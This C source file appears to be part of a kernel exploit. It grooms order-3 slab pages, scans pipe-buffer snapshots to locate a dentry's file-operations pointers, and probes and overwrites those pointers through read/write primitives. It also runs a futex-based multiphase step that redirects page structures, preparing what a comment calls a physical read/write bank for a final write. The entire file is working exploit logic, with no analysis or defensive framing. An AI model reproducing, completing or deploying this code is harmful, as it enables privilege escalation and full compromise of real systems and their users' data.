#include <string.h>

#include "dentry_fops_preflight.h"
#include "target_zzhl.h"

static int read_triplet(const struct oss_fops_preflight_transport *transport,
                        uint64_t object, struct oss_fops_triplet *out) {
  return transport->read64(transport->ctx,
                           object + ZZHL_FOPS_OWNER_OFF, &out->owner) &&
         transport->read64(transport->ctx,
                           object + ZZHL_FOPS_FLUSH_OFF, &out->flush) &&
         transport->read64(transport->ctx,
                           object + ZZHL_FOPS_RELEASE_OFF, &out->release);
}

static int write_triplet(const struct oss_fops_preflight_transport *transport,
                         uint64_t object,
                         const struct oss_fops_triplet *value) {
  return transport->write64(transport->ctx,
                            object + ZZHL_FOPS_OWNER_OFF, value->owner) &&
         transport->write64(transport->ctx,
                            object + ZZHL_FOPS_FLUSH_OFF, value->flush) &&
         transport->write64(transport->ctx,
                            object + ZZHL_FOPS_RELEASE_OFF, value->release);
}

static int equal_triplet(const struct oss_fops_triplet *left,
                         const struct oss_fops_triplet *right) {
  return left->owner == right->owner && left->flush == right->flush &&
         left->release == right->release;
}

static uint64_t load64(const unsigned char *source) {
  uint64_t value;
  memcpy(&value, source, sizeof(value));
  return value;
}

static int is_pipe_baseline(const unsigned char *page) {
  if (memcmp(page, OSS_DENTRY_PIPE_MARKER,
             OSS_DENTRY_PIPE_MARKER_SIZE) != 0) {
    return 0;
  }
  for (size_t i = OSS_DENTRY_PIPE_MARKER_SIZE;
       i < OSS_DENTRY_PIPE_SNAPSHOT_SIZE; i++) {
    if (page[i] != OSS_DENTRY_PIPE_FILL) return 0;
  }
  return 1;
}

size_t oss_collect_fops_candidates(
    oss_groom_candidate_source source, void *ctx,
    struct oss_fops_candidate out[OSS_FOPS_CANDIDATE_COUNT]) {
  if (!source || !out) return 0;
  memset(out, 0, sizeof(*out) * OSS_FOPS_CANDIDATE_COUNT);
  size_t count = 0;
  for (size_t attempt = 0;
       attempt < OSS_FOPS_CANDIDATE_ATTEMPTS &&
       count < OSS_FOPS_CANDIDATE_COUNT;
       attempt++) {
    uint64_t base = source(ctx);
    uint64_t object = base ? base + 0x1180ULL : 0;
    uint64_t page = object & ~0xfffULL;
    if (!base || (base & (OSS_FOPS_RECLAIM_ORDER3_SIZE - 1)) != 0 ||
        object < base || object >= base + OSS_FOPS_RECLAIM_ORDER3_SIZE ||
        page < base || page >= base + OSS_FOPS_RECLAIM_ORDER3_SIZE) {
      continue;
    }
    int duplicate = 0;
    for (size_t i = 0; i < count; i++) {
      duplicate |=
          (out[i].object & ~(uint64_t)(OSS_FOPS_RECLAIM_ORDER3_SIZE - 1)) ==
          base;
    }
    if (duplicate) continue;
    out[count].page = page;
    out[count].object = object;
    out[count].pipe_buffer = 0;
    count++;
  }
  if (count != OSS_FOPS_CANDIDATE_COUNT) {
    memset(out, 0, sizeof(*out) * OSS_FOPS_CANDIDATE_COUNT);
    return 0;
  }
  return count;
}

int oss_dentry_fops_scan_snapshots(
    const unsigned char *pipe_pages, size_t pipe_count,
    uint64_t target_start, uint64_t target_end, uint64_t target_page,
    const unsigned char expected[OSS_DENTRY_FOPS_IMAGE_SIZE],
    struct oss_dentry_snapshot_match *match) {
  if (!pipe_pages || !pipe_count || !expected || !match ||
      target_start >= target_end || (target_start & 0x7fffULL) != 0 ||
      (target_end & 0xfffULL) != 0 || target_end - target_start > 0x8000ULL ||
      (target_page & 0xfffULL) != 0 || target_page < target_start ||
      target_page >= target_end) {
    return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
  }

  memset(match, 0, sizeof(*match));
  match->pipe_index = (size_t)-1;
  match->object_offset = (size_t)-1;
  match->changed_pipe_index = (size_t)-1;

  for (size_t pipe_index = 0; pipe_index < pipe_count; pipe_index++) {
    const unsigned char *page =
        pipe_pages + pipe_index * OSS_DENTRY_PIPE_SNAPSHOT_SIZE;
    if (!is_pipe_baseline(page)) {
      match->changed_pipes++;
      match->changed_pipe_index = pipe_index;
    }
    for (size_t object_offset = OSS_DENTRY_OBJECT_FIRST;
         object_offset <= OSS_DENTRY_OBJECT_LIMIT;
         object_offset += OSS_DENTRY_OBJECT_STRIDE) {
      if (object_offset + OSS_DENTRY_FOPS_IMAGE_OFF +
              OSS_DENTRY_FOPS_IMAGE_SIZE >
          OSS_DENTRY_PIPE_SNAPSHOT_SIZE) {
        break;
      }
      /* Snapshot bytes map one concrete 4K page inside the order-3 slab. */
      uint64_t object = target_page + object_offset;
      if (object < target_start || object >= target_end) {
        continue;
      }

      const unsigned char *candidate = page + object_offset;
      uint64_t marker = load64(candidate + OSS_DENTRY_FOPS_OWNER_OFF);
      uint64_t forward = load64(candidate + OSS_DENTRY_LINK_OFF);
      uint64_t backward = load64(candidate + OSS_DENTRY_LINK_OFF + 8u);
      uint64_t link_address = object + OSS_DENTRY_LINK_OFF;
      if (marker != 0) {
        if (forward != link_address || backward != link_address) {
          match->link_mismatches++;
        }
        continue;
      }
      if (memcmp(candidate + OSS_DENTRY_FOPS_IMAGE_OFF, expected,
                 OSS_DENTRY_FOPS_IMAGE_SIZE) != 0) {
        match->image_mismatches++;
        continue;
      }

      match->exact_matches++;
      match->pipe_index = pipe_index;
      match->object_offset = object_offset;
      match->object_address = object;
    }
  }

  return match->changed_pipes == 1 && match->exact_matches == 1 &&
                 match->pipe_index == match->changed_pipe_index
             ? OSS_FOPS_PREFLIGHT_EXACT
             : OSS_FOPS_PREFLIGHT_NO_MATCH;
}

int oss_dentry_fops_preflight(
    const struct oss_fops_candidate *candidates, size_t count,
    const struct oss_fops_triplet *expected,
    const struct oss_fops_preflight_transport *transport,
    struct oss_fops_preflight_result *result) {
  if (!candidates || !count || !expected || !transport ||
      !transport->apply_probe || !transport->read64 || !transport->write64 ||
      !result) {
    return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
  }

  memset(result, 0, sizeof(*result));
  result->status = OSS_FOPS_PREFLIGHT_NO_MATCH;
  result->selected = (size_t)-1;

  for (size_t index = 0; index < count; index++) {
    const struct oss_fops_candidate *candidate = &candidates[index];
    struct oss_fops_triplet before;
    struct oss_fops_triplet after;
    struct oss_fops_triplet restored;

    result->scanned = index + 1;
    if (!candidate->page || !candidate->object || !candidate->pipe_buffer ||
        !read_triplet(transport, candidate->object, &before)) {
      result->status = OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
      return result->status;
    }
    int probe_ok = transport->apply_probe(transport->ctx, candidate);
    int read_ok = probe_ok && read_triplet(transport, candidate->object, &after);
    if (read_ok) {
      result->observed = after;
    }

    /* A probe may fail after altering its target. Restore first in every
     * case; never leave a failed candidate live while trying another one. */
    if (!write_triplet(transport, candidate->object, &before) ||
        !read_triplet(transport, candidate->object, &restored) ||
        !equal_triplet(&before, &restored)) {
      result->status = OSS_FOPS_PREFLIGHT_RESTORE_ERROR;
      return result->status;
    }
    if (!read_ok) {
      result->status = OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
      return result->status;
    }
    if (equal_triplet(&after, expected)) {
      result->status = OSS_FOPS_PREFLIGHT_EXACT;
      result->selected = index;
      return result->status;
    }
  }
  return result->status;
}

int oss_run_futex_multiphase_preflight(
    const struct oss_fops_candidate candidates[OSS_FOPS_CANDIDATE_COUNT],
    uint64_t pipe_page, uint64_t initial_lock,
    const struct oss_futex_multiphase_transport *transport,
    struct oss_futex_multiphase_result *result) {
  if (!candidates || !pipe_page || !initial_lock || !transport ||
      !transport->deliver || !transport->verify || !transport->advance_pipe ||
      !transport->narrow_pipe || !transport->release_pipe ||
      !transport->cleanup_pipe ||
      !transport->direct_to_page || !result) {
    return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
  }
  memset(result, 0, sizeof(*result));
  result->selected_candidate = (size_t)-1;
  result->changed_pipe = -1;
  int known_pipe = -1;
  for (size_t i = 0; i < OSS_FOPS_CANDIDATE_COUNT; i++) {
    uint64_t page_struct = transport->direct_to_page(transport->ctx,
                                                      candidates[i].page);
    if (!page_struct) return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
    struct oss_futex_phase apply = {
        .sequence = 12u + (unsigned)i * 2u,
        .parent = page_struct,
        .right = pipe_page + 0x800 + i * 0x28,
        .lock = initial_lock + 0x280 + i * 0x100,
    };
    struct oss_futex_phase restore = {
        .sequence = apply.sequence + 1,
        .parent = page_struct,
        .right = 0,
        .lock = initial_lock + 0x300 + i * 0x100,
    };
    if (!transport->deliver(transport->ctx, &apply))
      return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
    int changed = -1;
    int verified = transport->verify(transport->ctx, &candidates[i], &changed);
    if (!transport->deliver(transport->ctx, &restore))
      return OSS_FOPS_PREFLIGHT_RESTORE_ERROR;
    result->scanned = i + 1;
    if (changed < -1) {
      return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
    }
    if (changed < 0) {
      if (verified != OSS_FOPS_PREFLIGHT_NO_MATCH)
        return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
    } else {
      if (known_pipe >= 0 && known_pipe != changed)
        return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
      known_pipe = changed;
      if (verified == OSS_FOPS_PREFLIGHT_EXACT) {
        if (!transport->narrow_pipe(transport->ctx, (size_t)changed) ||
            !transport->release_pipe(transport->ctx))
          return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
        result->selected_candidate = i;
        result->changed_pipe = changed;
        return OSS_FOPS_PREFLIGHT_EXACT;
      }
      if (verified != OSS_FOPS_PREFLIGHT_NO_MATCH)
        return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
    }
    if (i + 1 < OSS_FOPS_CANDIDATE_COUNT &&
        !transport->advance_pipe(transport->ctx))
      return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
  }
  /* DiamondFox still drops the retained changed pipe after exhausting all
   * candidates.  This is cleanup only: callers must not interpret NO_MATCH as
   * permission to prepare the fresh physrw bank used by the final write. */
  if (known_pipe >= 0) {
    if (!transport->narrow_pipe(transport->ctx, (size_t)known_pipe) ||
        !transport->cleanup_pipe(transport->ctx))
      return OSS_FOPS_PREFLIGHT_TRANSPORT_ERROR;
    result->changed_pipe = known_pipe;
  }
  return OSS_FOPS_PREFLIGHT_NO_MATCH;
}
